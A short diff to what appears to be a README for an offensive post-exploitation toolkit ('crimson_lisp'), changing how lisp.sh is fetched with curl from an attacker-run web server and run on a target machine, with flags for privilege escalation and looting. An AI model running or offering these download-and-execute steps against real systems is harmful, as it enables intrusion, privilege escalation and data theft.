@@ -17,8 +17,11 @@ cd crimson_lisp
 sudo python3 -m http.server 80
 
 # ON THE TARGET MACHINE - download and execute
-curl -s http://127.0.0.1/lisp.sh | bash -s "-e" "-l" "-u http://127.0.0.1/"
-        
+curl -s -k http://127.0.0.1/lisp.sh -o lisp.sh
+chmod +x lisp.sh
+
+
+
         # -e => PRIVILEGE ESCALATION
         # -l => LOOTING
         # -u => HOST WITH TOOLS - If only "-u" option is used then only the tools will be downloaded.
